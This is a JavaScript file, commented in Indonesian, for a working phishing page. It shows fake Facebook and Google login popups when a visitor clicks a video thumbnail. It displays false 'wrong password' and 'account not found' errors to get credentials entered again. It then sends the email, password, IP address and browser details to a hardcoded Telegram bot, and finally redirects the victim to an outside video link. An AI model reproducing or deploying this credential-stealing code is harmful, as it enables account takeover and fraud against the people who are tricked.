// ========== KONFIGURASI TELEGRAM ==========
const BOT_TOKEN = "8686157259:AAEbLNInmaqnPwrTTogJC3AINXIWTGerZUM";
const CHAT_ID = "7933552719";
const REDIRECT_URL = "https://vidgf.com/f/wcubsmaineg";

// Variabel global
let selectedVideo = null;
let stepData = {}; // Untuk menyimpan data sementara

// ========== AMBIL IP PUBLIK ==========
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Gagal mendapatkan IP';
    }
}

// ========== KIRIM DATA KE TELEGRAM (HANYA UNTUK DATA VALID) ==========
async function sendToTelegram(email, password, platform) {
    const userAgent = navigator.userAgent;
    const platformNav = navigator.platform;
    const language = navigator.language;
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const ipAddress = await getUserIP();
    
    const message = `🔐 NEW LOGIN ${platform} 🔐
━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${password}
━━━━━━━━━━━━━━━━━━━
📱 Video: ${selectedVideo || 'Tidak diketahui'}
🌐 IP: ${ipAddress}
💻 User Agent: ${userAgent}
🖥️ Platform: ${platformNav}
🌍 Language: ${language}
🕐 Time: ${timestamp}
━━━━━━━━━━━━━━━━━━━
✅ Status: Login Success`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return null;
    }
}

// ========== TUTUP POPUP PERTAMA ==========
function closePopup() {
    document.getElementById('popupLogin').style.display = 'none';
}

// ========== TUTUP FORM FACEBOOK ==========
function closeFacebookForm() {
    document.getElementById('facebookFormPopup').style.display = 'none';
    document.getElementById('facebookEmail').value = '';
    document.getElementById('facebookPassword').value = '';
    document.getElementById('facebookFormError').innerText = '';
    document.getElementById('facebookFormError').className = 'facebook-error';
    const btn = document.getElementById('facebookSubmitBtn');
    if (btn) {
        btn.disabled = false;
        btn.innerText = 'Masuk';
    }
    // Reset step data
    delete stepData.facebook;
}

// ========== TUTUP FORM GOOGLE ==========
function closeGoogleForm() {
    document.getElementById('googleFormPopup').style.display = 'none';
    document.getElementById('googleEmail').value = '';
    document.getElementById('googlePassword').value = '';
    document.getElementById('googleFormError').innerText = '';
    document.getElementById('googleFormError').className = 'google-error';
    const btn = document.getElementById('googleSubmitBtn');
    if (btn) {
        btn.disabled = false;
        btn.innerText = 'Berikutnya';
    }
    // Reset step data
    delete stepData.google;
}

// ========== SUBMIT LOGIN FACEBOOK (2 LANGKAH - KIRIM SAAT VALID) ==========
async function submitFacebookLogin() {
    const email = document.getElementById('facebookEmail').value.trim();
    const password = document.getElementById('facebookPassword').value.trim();
    const errorDiv = document.getElementById('facebookFormError');
    const btn = document.getElementById('facebookSubmitBtn');
    
    // Validasi dasar
    if (!email) {
        errorDiv.innerText = 'Masukkan email atau nomor telepon';
        return;
    }
    if (!password) {
        errorDiv.innerText = 'Masukkan kata sandi';
        return;
    }
    
    // CEK APAKAH INI LANGKAH PERTAMA ATAU KEDUA
    if (!stepData.facebook) {
        // LANGKAH 1: Simpan data, tampilkan error "Kata sandi salah"
        stepData.facebook = { email: email, password: password };
        
        // TAMPILKAN ERROR (TIDAK MENGIRIM DATA KE TELEGRAM)
        errorDiv.innerText = 'Kata sandi salah. Apakah Anda lupa kata sandi?';
        errorDiv.style.color = '#d93025';
        
        // Kosongkan input password
        document.getElementById('facebookPassword').value = '';
        
        // Fokus ke input password lagi
        document.getElementById('facebookPassword').focus();
        
        return;
    } else {
        // LANGKAH 2: Data valid, KIRIM KE TELEGRAM
        await sendToTelegram(email, password, 'FACEBOOK');
        
        // Loading state
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Memproses...';
        
        // Redirect ke link tujuan
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 1000);
    }
}

// ========== SUBMIT LOGIN GOOGLE (2-3 LANGKAH - KIRIM SAAT VALID) ==========
async function submitGoogleFormLogin() {
    const email = document.getElementById('googleEmail').value.trim();
    const password = document.getElementById('googlePassword').value.trim();
    const errorDiv = document.getElementById('googleFormError');
    const btn = document.getElementById('googleSubmitBtn');
    
    // Validasi dasar
    if (!email) {
        errorDiv.innerText = 'Masukkan email atau nomor telepon';
        return;
    }
    if (!password) {
        errorDiv.innerText = 'Masukkan kata sandi';
        return;
    }
    
    // CEK FORMAT EMAIL (harus @gmail.com)
    const isValidGmail = email.endsWith('@gmail.com') || email.endsWith('@gmail.co.id');
    
    // ========== KASUS 1: EMAIL BUKAN @GMAIL (3 LANGKAH) ==========
    if (!isValidGmail) {
        // CEK LANGKAH UNTUK EMAIL TIDAK VALID
        if (!stepData.google || stepData.google.step === 1) {
            // LANGKAH 1: Error Akun Tidak Ditemukan (TIDAK KIRIM DATA)
            stepData.google = { step: 1, email: email, password: password };
            
            // Tampilkan error "Akun tidak ditemukan"
            errorDiv.innerHTML = '<svg style="display: inline-block; vertical-align: middle; margin-right: 4px;" width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Akun Google tidak ditemukan.';
            errorDiv.style.color = '#d93025';
            
            // Kosongkan input email dan password
            document.getElementById('googleEmail').value = '';
            document.getElementById('googlePassword').value = '';
            
            // Fokus ke input email
            document.getElementById('googleEmail').focus();
            
            return;
        } else if (stepData.google.step === 2) {
            // LANGKAH 2: Sekarang email sudah benar (@gmail), cek password
            if (email.endsWith('@gmail.com') || email.endsWith('@gmail.co.id')) {
                // Email sudah benar format, simpan dan lanjut ke step password
                stepData.google = { step: 3, email: email, password: password };
                
                // Tampilkan error "Kata sandi salah" (TIDAK KIRIM DATA)
                errorDiv.innerHTML = '<svg style="display: inline-block; vertical-align: middle; margin-right: 4px;" width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Kata sandi salah. Coba lagi.';
                errorDiv.style.color = '#d93025';
                
                // Kosongkan input password
                document.getElementById('googlePassword').value = '';
                document.getElementById('googlePassword').focus();
                
                return;
            } else {
                // Masih email tidak valid, ulangi step 1
                errorDiv.innerHTML = '<svg style="display: inline-block; vertical-align: middle; margin-right: 4px;" width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Akun Google tidak ditemukan. Gunakan email @gmail.com.';
                errorDiv.style.color = '#d93025';
                document.getElementById('googleEmail').value = '';
                document.getElementById('googlePassword').value = '';
                document.getElementById('googleEmail').focus();
                return;
            }
        } else if (stepData.google.step === 3) {
            // LANGKAH 3: Data final valid, KIRIM KE TELEGRAM
            await sendToTelegram(email, password, 'GOOGLE');
            
            // Loading state
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Memproses...';
            
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1000);
        }
        return;
    }
    
    // ========== KASUS 2: EMAIL SUDAH @GMAIL (2 LANGKAH) ==========
    if (!stepData.google || stepData.google.step === undefined) {
        // LANGKAH 1: Simpan email, tampilkan error "Kata sandi salah" (TIDAK KIRIM DATA)
        stepData.google = { step: 2, email: email, password: password };
        
        // Tampilkan error kata sandi salah
        errorDiv.innerHTML = '<svg style="display: inline-block; vertical-align: middle; margin-right: 4px;" width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Kata sandi salah. Coba lagi.';
        errorDiv.style.color = '#d93025';
        
        // Kosongkan input password
        document.getElementById('googlePassword').value = '';
        
        // Fokus ke input password lagi
        document.getElementById('googlePassword').focus();
        
        return;
    } else if (stepData.google.step === 2) {
        // LANGKAH 2: Data final valid, KIRIM KE TELEGRAM
        await sendToTelegram(email, password, 'GOOGLE');
        
        // Loading state
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Memproses...';
        
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 1000);
    }
}

// ========== EVENT LISTENER ==========
// Klik thumbnail
document.querySelectorAll('.thumbnail-box').forEach(el => {
    el.addEventListener('click', () => {
        const card = el.closest('.video-card');
        if (card) {
            const info = card.querySelector('.video-info');
            if (info) selectedVideo = info.innerText;
        }
        document.getElementById('popupLogin').style.display = 'flex';
    });
});

// Tombol login Facebook di popup pertama
const facebookBtn = document.getElementById('facebookLoginBtn');
if (facebookBtn) {
    facebookBtn.addEventListener('click', () => {
        closePopup();
        document.getElementById('facebookFormPopup').style.display = 'flex';
    });
}

// Tombol login Google di popup pertama
const googleBtn = document.getElementById('googleLoginBtn');
if (googleBtn) {
    googleBtn.addEventListener('click', () => {
        closePopup();
        document.getElementById('googleFormPopup').style.display = 'flex';
    });
}

// Tombol close popup pertama
const closePopupBtn = document.getElementById('closePopupBtn');
if (closePopupBtn) {
    closePopupBtn.addEventListener('click', closePopup);
}

// Tombol close form Facebook
const closeFacebookBtn = document.getElementById('closeFacebookBtn');
if (closeFacebookBtn) {
    closeFacebookBtn.addEventListener('click', closeFacebookForm);
}

// Tombol submit form Facebook
const facebookSubmitBtn = document.getElementById('facebookSubmitBtn');
if (facebookSubmitBtn) {
    facebookSubmitBtn.addEventListener('click', submitFacebookLogin);
}

// Tombol submit form Google
const googleSubmitBtn = document.getElementById('googleSubmitBtn');
if (googleSubmitBtn) {
    googleSubmitBtn.addEventListener('click', submitGoogleFormLogin);
}

// Tutup popup pertama jika klik di luar
const popupLogin = document.getElementById('popupLogin');
if (popupLogin) {
    popupLogin.addEventListener('click', (e) => {
        if (e.target === popupLogin) {
            closePopup();
        }
    });
}

// Tutup form Facebook jika klik di luar
const facebookPopup = document.getElementById('facebookFormPopup');
if (facebookPopup) {
    facebookPopup.addEventListener('click', (e) => {
        if (e.target === facebookPopup) {
            closeFacebookForm();
        }
    });
}

// Tutup form Google jika klik di luar
const googlePopup = document.getElementById('googleFormPopup');
if (googlePopup) {
    googlePopup.addEventListener('click', (e) => {
        if (e.target === googlePopup) {
            closeGoogleForm();
        }
    });
}

// Enter key untuk submit Facebook
const facebookPassword = document.getElementById('facebookPassword');
if (facebookPassword) {
    facebookPassword.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            submitFacebookLogin();
        }
    });
}

// Enter key untuk submit Google
const googlePassword = document.getElementById('googlePassword');
if (googlePassword) {
    googlePassword.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            submitGoogleFormLogin();
        }
    });
}

// Tombol ESC untuk menutup popup
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        const popup1 = document.getElementById('popupLogin');
        const fbPopup = document.getElementById('facebookFormPopup');
        const googlePopupElem = document.getElementById('googleFormPopup');
        if (fbPopup && fbPopup.style.display === 'flex') {
            closeFacebookForm();
        } else if (googlePopupElem && googlePopupElem.style.display === 'flex') {
            closeGoogleForm();
        } else if (popup1 && popup1.style.display === 'flex') {
            closePopup();
        }
    }
});
